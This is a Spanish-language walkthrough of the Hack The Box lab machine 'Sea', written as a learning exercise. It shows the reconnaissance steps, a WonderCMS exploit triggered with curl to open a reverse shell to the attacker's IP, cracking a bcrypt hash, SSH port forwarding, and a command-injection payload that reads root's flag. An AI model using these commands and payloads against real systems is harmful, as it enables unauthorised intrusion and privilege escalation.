
## Escaneo con nmap

Empezamos con el escaneo con nmap de los puertos abiertos:

`sudo nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- -oG Puertos 10.10.11.28`

![image](/assets/images/Maquinas/Sea/ports.png)

Por ahora podemos ver que los puertos **22 y 80** están abiertos.


Después de escanear los puertos lanzaremos scripts de enumeración bajo esos puertos:

`sudo nmap -sC -sV -p 22,80 10.10.11.28 -oN targeted`

![image](/assets/images/Maquinas/Sea/targeted.png)

Por ahora no hemos encontrado la gran cosa pero al menos ya tenemos cierta información.

<br>
## Investigando el servidor web

![image](/assets/images/Maquinas/Sea/web.png)

Nos muestra la siguiente web, y nos damos cuenta de que en el código fuente:

![image](/assets/images/Maquinas/Sea/dns.png)

Al parecer usa un sub dominio llamado "sea.htb" , por lo que lo vamos a agregar al archivo **/etc/hosts/** y luego revisar que contiene esa web:

![image](/assets/images/Maquinas/Sea/addDns.png)

Una vez agregado en DNS vamos a la página pero al parecer es la misma web.

<br>
## Fuzzing en la web

Ahora vamos a intentar fuzzear la web:

`dirsearch --url http://sea.htb/ -t 200`

![image](/assets/images/Maquinas/Sea/fuzz.png)

Pero vemos que no encontramos nada tan interesante a primera vista.

Y viendo el código de la web encontré lo siguiente:

![image](/assets/images/Maquinas/Sea/bike.png)

Existe una ruta llamada bike dentro de la ruta de themes, así que haremos fuzzing ahí para ver si encontramos algo:

`dirsearch --url http://sea.htb/themes/bike -t 200`

![image](/assets/images/Maquinas/Sea/fuzz2.png)

Vemos que encontramos ciertas rutas nuevas, y en la ruta de README.md encontramos lo siguiente:

![image](/assets/images/Maquinas/Sea/readme.png)

Vemos que usa un CMS llamado WonderCMS.

Y en la ruta /version encontramos lo que parece ser la versión de dicho CMS:

![image](/assets/images/Maquinas/Sea/version.png)

Así que ya tenemos información sobre este CMS.
<br>
## Explotando el WonderCMS

Buscando en la web encontramos el siguiente exploit:

[Exploit WonderCMS](https://github.com/prodigiousMind/CVE-2023-41425.git)

Intentaremos usar el exploit:

![image](/assets/images/Maquinas/Sea/intento1.png)

Intentamos ejecutar el exploit cómo nos decía en las instrucciones, pero al parecer no sucedía nada, así que revisando el código:

![image](/assets/images/Maquinas/Sea/codeExploit.png)

Lo que el exploit hace es instalar un modulo por medio de alguna falla del CMS, y luego hace los pasos que se ven en la imagen.

Pero al ejecutar el exploit no nos da nada, así que haremos el último paso manualmente.

Tenemos en el código:
`xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);`

Intentaremos hacer esto con curl:

`curl "http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.215&lport=4444"`

Ahora nos ponemos en escucha por el puerto 4444:

![image](/assets/images/Maquinas/Sea/listener.png)

Ahora ejecutamos la petición que hicimos con curl:

![image](/assets/images/Maquinas/Sea/curl.png)

Y vemos que hemos recibido la reverse shell en el listener:

![image](/assets/images/Maquinas/Sea/reverse.png)

## Tratamiento TTY

Ahora ya que estamos dentro del host victima, vamos a hacer el tratamiento de la TTY para tener una shell interactiva:

`script /dev/null -c bash`

ctrl + z

`stty raw -echo; fg`

`reset`

`xterm`

Y luego ejecutamos:

export TERM=xterm : para indicar que queremos una xterm de terminal.

export SHELL=bash : Y que queremos una bash.

Por último solo quedaría ir a una terminal nuestra y ejecutar esto:

`stty size`

Y los valores que nos devuelva los usaremos para ajustar la reverse shell a el tamaño de nuestra terminal por defecto y no tener problemas de proporciones:

` stty rows 43 columns 141`

## Escalando privilegios

Lo primero que suelo hacer al entrar a un servidor es revisar los archivos de configuración para ver si hay alguna base de datos con credenciales, así que en la ruta /var/www/html encontré lo siguiente:

![image](/assets/images/Maquinas/Sea/database.png)

Y revisando esa database encontré lo siguiente:

![image](/assets/images/Maquinas/Sea/hash.png)

Encontré un hash, así que intentaré crackearlo:

Descubrí que posiblemente sea un formato bcrypt, por lo que usando john intentaremos crackearlo:

`sudo john --format=bcrypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

![image](/assets/images/Maquinas/Sea/hashErrorFormato.png)

Nos dice que no se encontró ningún hash, y buscando me dí cuenta que en el hash que encontramos usaba estás diagonales `\` pero en este formato no era necesario usarlas.

Así que una vez guardemos el hash sin esos caracteres y volver a intentar, vemos que ahora nos permite crackear el hash:

![image](/assets/images/Maquinas/Sea/cracked.png)

Y vemos que nos ha crackeado el hash de forma exitosa.

Ahora en la ruta /home vemos que existen 2 usuarios:

![image](/assets/images/Maquinas/Sea/users.png)

Probaremos si la contraseña es de alguno de estos 2:

![image](/assets/images/Maquinas/Sea/amay.png)

Al parecer la contraseña era del usuario amay.

Así que ahora continuaremos escalando privilegios a root.

<br>
## Escalando privilegios a root

Buscando en el sistema por un rato no encontré nada, pero al ver las conexiones activas usando el comando:

`netstat -an`

![image](/assets/images/Maquinas/Sea/8080.png)

Y nos llama la atención el puerto 808, ya que parece que tiene conexiones más frecuentemente.

Y el puerto 8080 por defecto corre servidores web, así que usaremos un concepto llamado SSH Por Forwarding o re dirección de puertos SSH.

En una terminal nueva haremos lo siguiente:

![image](/assets/images/Maquinas/Sea/forwarding.png)

`ssh -L 8888:localhost:8080 amay@sea.htb`

Recibiremos en el puerto 8888 de nuestro localhost(maquina atacante) recibiremos el puerto 8080 al que amay tiene acceso a través del servidor sea.htb.

Y una vez hecho esto vamos a la web:

![image](/assets/images/Maquinas/Sea/login.png)

Y nos pide credenciales, entraremos con las de amay.

![image](/assets/images/Maquinas/Sea/web2.png)

Una vez dentro de la web, al parecer tenemos acceso de lectura a 2 archivos, al access.log y al auth.log.

Algo curioso es que si nosotros como el usuario amay intentamos leer esos archivos desde la terminal:

![image](/assets/images/Maquinas/Sea/noread.png)

Así que seguramente la ejecución de lectura de ese archivo lo está haciendo el usuario root.

Así que interceptaremos una petición con burpSuite:

![image](/assets/images/Maquinas/Sea/burp.png)

Vemos que el formato usa %2F para reemplazar a la diagonal /.

![image](/assets/images/Maquinas/Sea/root.png)

Podemos ver que intentamos leer la flag de root, pero nos da error, pero al poner algún valor que separe el comando que queremos leer de otro comando cualquiera, esto ocasionará que fuerce la ejecución del primer comando, así que nuestra nueva petición quedará así:

`log_file=%2Froot%2Froot.txt;XD&analyze_log=`

![image](/assets/images/Maquinas/Sea/rootFlag.png)

Y hemos obtenido la flag de root, y con esto terminamos el objetivo de la maquina c: